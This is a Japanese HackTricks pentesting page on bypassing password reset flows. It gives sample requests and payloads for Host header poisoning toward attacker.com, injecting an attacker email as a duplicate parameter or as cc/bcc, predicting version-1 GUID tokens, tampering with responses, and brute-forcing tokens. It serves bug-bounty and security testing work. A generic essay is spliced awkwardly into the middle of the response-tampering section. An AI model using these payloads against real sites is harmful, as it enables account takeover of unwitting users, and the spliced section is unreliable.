# パスワードのリセット/忘れた場合のバイパス

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**をフォロー**してください。
* **ハッキングのトリックを共有するには、**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProofをフォロー**](https://bit.ly/3xrrDrL) **して、web3のバグについてもっと学びましょう**

🐞 web3のバグチュートリアルを読む

🔔 新しいバグバウンティについて通知を受ける

💬 コミュニティディスカッションに参加する

以下のテクニックの再編集は、[https://anugrahsr.github.io/posts/10-Password-reset-flaws/](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)から取得されました。

## リファラ経由のパスワードリセットトークンの漏洩

**HTTPリファラ**は、要求されているリソースにリンクされているウェブページのアドレスを識別するオプションのHTTPヘッダーフィールドです。リファラ要求ヘッダーには、現在要求されているページへのリンクが行われた前のウェブページのアドレスが含まれています。

![](https://www.optimizesmart.com/wp-content/uploads/2020/01/1-1-2.jpg)

### 悪用方法

* メールアドレスにパスワードリセットを要求する
* パスワードリセットリンクをクリックする
* パスワードを変更しない
* 任意のサードパーティのウェブサイト（例：Facebook、Twitter）をクリックする
* Burpsuiteプロキシでリクエストをインターセプトする
* リファラヘッダーがパスワードリセットトークンを漏洩しているかどうかを確認する

### 影響

特定のサイトを制御している人は、ユーザーのパスワード（CSRF攻撃）を変更することができます。なぜなら、この人物はユーザーのリセットパスワードトークンを知っているからです。

### 参考：

* [https://hackerone.com/reports/342693](https://hackerone.com/reports/342693)
* [https://hackerone.com/reports/272379](https://hackerone.com/reports/272379)
* [https://hackerone.com/reports/737042](https://hackerone.com/reports/737042)
* [https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a](https://medium.com/@rubiojhayz1234/toyotas-password-reset-token-and-email-address-leak-via-referer-header-b0ede6507c6a)
* [https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1](https://medium.com/@shahjerry33/password-reset-token-leak-via-referrer-2e622500c2c1)

## パスワードリセットの改ざん

ホストヘッダ攻撃を見つけ、スコープ外である場合は、パスワードリセットボタンを探してみてください！

![](https://portswigger.net/web-security/images/password-reset-poisoning.svg)

### 悪用方法

* Burpsuiteでパスワードリセットリクエストをインターセプトする
* 次のヘッダーを追加するか、Burpsuiteでヘッダーを編集する（1つずつ試してください）
```
Host: attacker.com
```

```
Host: target.com
X-Forwarded-Host: attacker.com
```

```
Host: target.com
Host: attacker.com
```
* メール内のパスワード変更リンクが attacker.com を指していないか確認します。

### パッチ

`$_SERVER['HTTP_HOST']` の代わりに `$_SERVER['SERVER_NAME']` を使用します。
```php
$resetPasswordURL = "https://{$_SERVER['HTTP_HOST']}/reset-password.php?token=12345678-1234-1234-1234-12345678901";
```
### 影響

被害者は、メールで悪意のあるリンクを受け取り、クリックすると、ユーザーのパスワードリセットリンク/トークンが攻撃者に漏洩し、アカウントが完全に乗っ取られる可能性があります。

### 参考：

* https://hackerone.com/reports/226659
* https://hackerone.com/reports/167631
* https://www.acunetix.com/blog/articles/password-reset-poisoning/
* https://pethuraj.com/blog/how-i-earned-800-for-host-header-injection-vulnerability/
* https://medium.com/@swapmaurya20/password-reset-poisoning-leading-to-account-takeover-f178f5f1de87

## メールパラメータの操作によるパスワードリセット

### 攻撃手法

* 攻撃者のメールを2番目のパラメータとして追加する（`&`を使用）
```php
POST /resetPassword
[...]
email=victim@email.com&email=attacker@email.com
```
* 2番目のパラメータとして攻撃者のメールアドレスを%20を使用して追加します。
```php
POST /resetPassword
[...]
email=victim@email.com%20email=attacker@email.com
```
* 攻撃者のメールアドレスを2番目のパラメータとして追加します。使用方法は `|` を使います。
```php
POST /resetPassword
[...]
email=victim@email.com|email=attacker@email.com
```
* 2番目のパラメータとして攻撃者のメールアドレスをccとして追加します。
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
```
* 2番目のパラメータとして攻撃者のメールアドレスをBCCに追加します。
```php
POST /resetPassword
[...]
email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
```
* 攻撃者のメールアドレスを2番目のパラメータとして追加します。`,`を使用してください。
```php
POST /resetPassword
[...]
email="victim@mail.tld",email="attacker@mail.tld"
```
* JSON配列の2番目のパラメータとして攻撃者のメールアドレスを追加します。
```php
POST /resetPassword
[...]
{"email":["victim@mail.tld","atracker@mail.tld"]}
```
### 参考

* https://medium.com/@0xankush/readme-com-account-takeover-bugbounty-fulldisclosure-a36ddbe915be
* https://ninadmathpati.com/2019/08/17/how-i-was-able-to-earn-1000-with-just-10-minutes-of-bug-bounty/
* https://twitter.com/HusseiN98D/status/1254888748216655872

## APIパラメータを使用してユーザーのメールアドレスとパスワードを変更する

### 攻撃手法

* 攻撃者は自分のアカウントでログインし、パスワード変更機能に移動する必要があります
* Burp Suiteを起動し、リクエストをインターセプトします
* リクエストをインターセプトした後、リピーターに送信し、メールアドレスとパスワードのパラメータを変更します
```php
POST /api/changepass
[...]
("form": {"email":"victim@email.tld","password":"12345678"})
```
### 参考

* https://medium.com/@adeshkolte/full-account-takeover-changing-email-and-password-of-any-user-through-api-parameters-3d527ab27240

### レート制限なし：メールボム<a href="#5-no-rate-limiting-email-bombing" id="5-no-rate-limiting-email-bombing"></a>

### 悪用

* Burp Suiteを起動し、パスワードリセットリクエストをインターセプトします
* イントルーダーに送信します
* ヌルペイロードを使用します

### 参考

* https://hackerone.com/reports/280534
* https://hackerone.com/reports/794395

## パスワードリセットトークンの生成方法を調べる

パスワードリセットトークンのパターンを特定します

![](https://encrypted-tbn0.gstatic.com/images?q=tbn%3AANd9GcSvCcLcUTksGbpygrJB4III5BTBYEzYQfKJyg\&usqp=CAU)

もし

* タイムスタンプに基づいて生成される場合
* ユーザーIDに基づいて生成される場合
* ユーザーのメールに基づいて生成される場合
* ユーザーの名前と姓に基づいて生成される場合
* 誕生日に基づいて生成される場合
* 暗号化に基づいて生成される場合

Burp Sequencerを使用してトークンのランダム性や予測可能性を見つけます。

## 推測可能なGUID

異なるタイプのGUIDがあります：

* **バージョン0：** nil GUID（"00000000-0000-0000-0000-000000000000"）でのみ見られます。
* **バージョン1：** GUIDは次のように予測可能な方法で生成されます：
* 現在の時刻
* 生成システムの稼働時間中にGUID間で一定の「クロックシーケンス」がランダムに生成されます
* 利用可能な場合、システムのMACアドレスに基づいて生成される「ノードID」
* **バージョン3：** GUIDは、指定された名前と名前空間のMD5ハッシュを使用して生成されます。
* **バージョン4：** GUIDはランダムに生成されます。
* **バージョン5：** GUIDは、指定された名前と名前空間のSHA1ハッシュを使用して生成されます。

GUIDを見てそのバージョンを特定することが可能です。そのための小さなツールがあります：[**guidtool**](https://github.com/intruder-io/guidtool)\*\*\*\*
```http
guidtool -i 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c
UUID version: 1
UUID time: 2021-11-17 17:52:18.141000
UUID timestamp: 138564643381410000
UUID node: 17547390002044
UUID MAC address: 0f:f5:91:f2:a3:7c
UUID clock sequence: 3426
```
もしリセットパスワードのGUIDを生成するために使用されるバージョンが1の場合、GUIDをブルートフォース攻撃できます。
```http
guidtool 1b2d78d0-47cf-11ec-8d62-0ff591f2a37c -t '2021-11-17 18:03:17' -p 10000
a34aca00-47d0-11ec-8d62-0ff591f2a37c
a34af110-47d0-11ec-8d62-0ff591f2a37c
```
### 参考文献

* [https://www.intruder.io/research/in-guid-we-trust](https://www.intruder.io/research/in-guid-we-trust)

## レスポンスの操作：悪いレスポンスを良いものに置き換える

以下のようなリクエストとレスポンスを探してください。
```php
HTTP/1.1 401 Unauthorized
(“message”:”unsuccessful”,”statusCode:403,”errorDescription”:”Unsuccessful”)
```
# パスワードのリセット

パスワードのリセット機能は、ユーザーがパスワードを忘れた場合に便利ですが、悪意のあるユーザーにとっては攻撃の標的になる可能性があります。このセクションでは、パスワードのリセット機能に関する攻撃技術について説明します。

## パスワードリセットの脆弱性

パスワードリセット機能には、以下のような脆弱性が存在する場合があります。

### 1. ユーザー識別情報の不十分な確認

パスワードリセット要求を処理する際に、ユーザーの識別情報（例：メールアドレス、ユーザー名）を適切に確認しない場合、攻撃者は他のユーザーのアカウントにアクセスすることができます。これは、攻撃者が他のユーザーの識別情報を推測することで実現される可能性があります。

### 2. 弱いパスワードリセットトークン

パスワードリセットトークンは、ユーザーがパスワードをリセットするために使用する一時的なトークンです。しかし、弱いトークン生成アルゴリズムや予測可能なトークンの使用により、攻撃者はトークンを推測して他のユーザーのアカウントにアクセスすることができます。

### 3. セキュアでないパスワードリセット手順

パスワードリセット手順がセキュアでない場合、攻撃者はリセット手順を悪用して他のユーザーのアカウントにアクセスすることができます。例えば、攻撃者がリセットリンクを傍受したり、リセット手順を途中で中断したりすることができます。

## パスワードリセット攻撃の手法

以下に、パスワードリセット機能に対する攻撃手法の一部を示します。

### 1. ユーザー識別情報の推測

攻撃者は、他のユーザーの識別情報を推測することで、パスワードリセット要求を行うことができます。例えば、一般的なユーザー名やメールアドレスの組み合わせを試すことで、他のユーザーのアカウントにアクセスすることができます。

### 2. パスワードリセットトークンの推測

攻撃者は、弱いトークン生成アルゴリズムや予測可能なトークンの使用により、パスワードリセットトークンを推測することができます。これにより、他のユーザーのアカウントにアクセスすることができます。

### 3. パスワードリセット手順の傍受

攻撃者は、パスワードリセット手順を傍受することで、他のユーザーのアカウントにアクセスすることができます。これは、攻撃者がリセットリンクを傍受したり、リセット手順を途中で中断したりすることによって実現されます。

## パスワードリセットのセキュリティ強化

パスワードリセット機能のセキュリティを強化するためには、以下の対策を実施することが重要です。

### 1. ユーザー識別情報の適切な確認

パスワードリセット要求を処理する際に、ユーザーの識別情報を適切に確認することが重要です。例えば、セキュリティの高いメール認証や二要素認証を使用することで、攻撃者が他のユーザーのアカウントにアクセスすることを防ぐことができます。

### 2. 強力なパスワードリセットトークンの使用

強力なトークン生成アルゴリズムを使用し、予測可能なトークンの使用を避けることが重要です。これにより、攻撃者がトークンを推測して他のユーザーのアカウントにアクセスすることを防ぐことができます。

### 3. セキュアなパスワードリセット手順の実施

セキュアなパスワードリセット手順を実施することが重要です。例えば、リセットリンクの有効期限を設定したり、リセット手順の進行状況を適切に管理することで、攻撃者がリセット手順を傍受したり中断したりすることを防ぐことができます。
```php
HTTP/1.1 200 OK
(“message”:”success”,”statusCode:200,”errorDescription”:”Success”)
```
### 参考

* https://medium.com/@innocenthacker/how-i-found-the-most-critical-bug-in-live-bug-bounty-event-7a88b3aa97b3

### 期限切れのトークンの使用 <a href="#8-using-expired-token" id="8-using-expired-token"></a>

* 期限切れのトークンが再利用できるかどうかを確認します

### パスワードリセットトークンのブルートフォース攻撃 <a href="#9-brute-force-password-rest-token" id="9-brute-force-password-rest-token"></a>

Burpsuiteを使用してリセットトークンをブルートフォース攻撃してみてください
```php
POST /resetPassword
[...]
email=victim@email.com&code=$BRUTE$
```
* IPベースのレート制限をバイパスするために、Burp SuiteでIP-Rotatorを使用します。

### 参考

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

### トークンを使用して試してみる <a href="#10-try-using-your-token" id="10-try-using-your-token"></a>

* パスワードリセットトークンを被害者のアカウントに追加してみてください。
```php
POST /resetPassword
[...]
email=victim@email.com&code=$YOUR_TOKEN$
```
### 参考

* https://twitter.com/HusseiN98D/status/1254888748216655872/photo/1

## ログアウト/パスワードリセットにおけるセッションの無効化

ユーザーがログアウトまたはパスワードをリセットする場合、現在のセッションは無効にする必要があります。\
したがって、ユーザーがログインしている間に**クッキーを取得**し、**ログアウト**して、**クッキー**がまだ**有効**かどうかを**確認**します。\
ログアウトの代わりに**パスワードを変更**することで、プロセスを繰り返します。

## リセットトークンの有効期限

**リセットトークンには有効期限が必要**であり、期限が切れた後はユーザーのパスワードを変更するためにトークンは有効ではありません。

## 追加のチェック

* username@burp\_collab.net を使用してコールバックを分析する
* User carbon copy email=victim@mail.com%0a%0dcc:hacker@mail.com
* 長いパスワード (>200) は DoS を引き起こす
* 2番目のメールパラメータと値を追加する

<figure><img src="../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**HackenProof をフォロー**](https://bit.ly/3xrrDrL) **ウェブ3のバグについてもっと学ぶために**

🐞 ウェブ3のバグチュートリアルを読む

🔔 新しいバグ報奨金について通知を受ける

💬 コミュニティディスカッションに参加する

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか**？ **HackTricks で会社を宣伝**したいですか？または、**PEASS の最新バージョンにアクセスしたり、HackTricks を PDF でダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見しましょう、私たちの独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクション
* [**公式の PEASS & HackTricks スワッグ**](https://peass.creator-spring.com) を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord グループ**](https://discord.gg/hRep4RUj7f) または [**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** をフォロー**してください。
* **ハッキングのトリックを共有するには、PR を** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>
